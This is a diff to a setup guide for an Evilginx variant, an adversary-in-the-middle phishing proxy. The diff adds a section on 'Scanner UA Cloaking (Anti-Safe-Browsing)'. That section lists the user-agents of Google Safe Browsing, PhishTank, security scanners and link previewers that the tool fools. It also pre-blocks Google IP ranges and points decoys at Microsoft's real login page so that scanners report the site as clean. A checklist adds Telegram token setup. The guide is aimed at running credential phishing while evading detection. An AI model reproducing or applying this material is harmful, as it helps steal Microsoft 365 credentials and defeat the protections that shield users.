@@ -242,7 +242,7 @@ At the `evilginx>` prompt:
 config domain yoursite.com
 config ipv4 external YOUR_VPS_IP
 config autocert on
-config unauth_url https://www.office365.com
+config unauth_url https://login.microsoftonline.com
 config strip_headers on
 blacklist unauth
 exit
@@ -597,6 +597,46 @@ ExecStart=... -block-countries RU,CN,IR,KP
 
 Use ISO 3166-1 alpha-2 country codes. Requires GeoIP database.
 
+## Scanner UA Cloaking (Anti-Safe-Browsing)
+
+Evilginx Telegram Edition has built-in scanner UA detection. Any request whose `User-Agent` matches a known security crawler or scanner is intercepted **before** it reaches any phishing logic and is served the content of your `unauth_url` instead — so Google Safe Browsing, PhishTank, link previewers (WhatsApp, Telegram, Discord, Slack), and generic HTTP clients (curl, python-requests, etc.) all see a legitimate page. Their IP is also auto-blacklisted so subsequent requests are dropped at the IP level.
+
+**Detected categories:**
+- Google Safe Browsing (`Google-SafeBrowsing`, `Googlebot`, `AdsBot-Google`)
+- Phishing feeds (`PhishTank`, `OpenPhish`)
+- Generic clients (`curl`, `wget`, `python-requests`, `python-urllib`, `go-http-client`, `libwww-perl`, `java/`, `okhttp/`)
+- Security scanners (`nuclei`, `sqlmap`, `nikto`, `masscan`, `zgrab`, `nessus`, `burpsuite`)
+- Search crawlers (`Bingbot`, `YandexBot`, `Slurp`, `DuckDuckBot`, `Baiduspider`)
+- Link previewers (`facebookexternalhit`, `Twitterbot`, `LinkedInBot`, `WhatsApp`, `TelegramBot`, `Discordbot`, `Slackbot`)
+
+**Required config (already set in Part 7):**
+
+```
+config unauth_url https://login.microsoftonline.com
+blacklist unauth
+```
+
+`unauth_url` is what scanners receive as the spoofed page. Point it at the real login page you are mirroring — scanners will report a clean result.
+
+**Optional: pre-seed Google IP ranges**
+
+Append to `~/.evilginx/blacklist.txt` to block Google crawlers at the IP level before they even make a request:
+
+```
+; Google Safe Browsing / crawler ranges
+66.249.64.0/19
+66.249.80.0/20
+66.249.90.0/24
+64.233.160.0/19
+72.14.192.0/18
+74.125.0.0/16
+209.85.128.0/17
+216.58.192.0/19
+216.239.32.0/19
+```
+
+Restart evilginx after editing `blacklist.txt` — the file is loaded at startup.
+
 ---
 
 # PART 17: COMPLETE COMMAND REFERENCE
@@ -677,9 +717,12 @@ redirects add landing loading.html on
 | Command | Description |
 |---------|-------------|
 | `blacklist all` | Block everyone except whitelisted IPs |
-| `blacklist unauth` | Block unauthorized visitors only |
+| `blacklist unauth` | Block unauthorized visitors only (recommended) |
 | `blacklist noadd` | Redirect but don't add to blacklist |
 | `blacklist off` | Disable blacklist |
+| `blacklist log on/off` | Toggle verbose blacklist logging |
+
+> **Scanner UA cloaking is automatic** — known crawlers and security scanners (GSB, PhishTank, curl, python-requests, link previewers, etc.) are intercepted before any phishing logic runs and served the `unauth_url` content. Set `blacklist unauth` and `config unauth_url` to activate.
 
 ## System commands
 
@@ -823,7 +866,8 @@ If `go: command not found`, run `source ~/.bashrc` or reconnect SSH.
 - [ ] `config domain` set
 - [ ] `config ipv4 external` set
 - [ ] `config autocert on`
-- [ ] `config unauth_url` set
+- [ ] `config unauth_url https://login.microsoftonline.com` set
+- [ ] `blacklist unauth` set
 - [ ] `config teletoken` and `config chatid` set
 - [ ] `config telegram test` succeeds
 
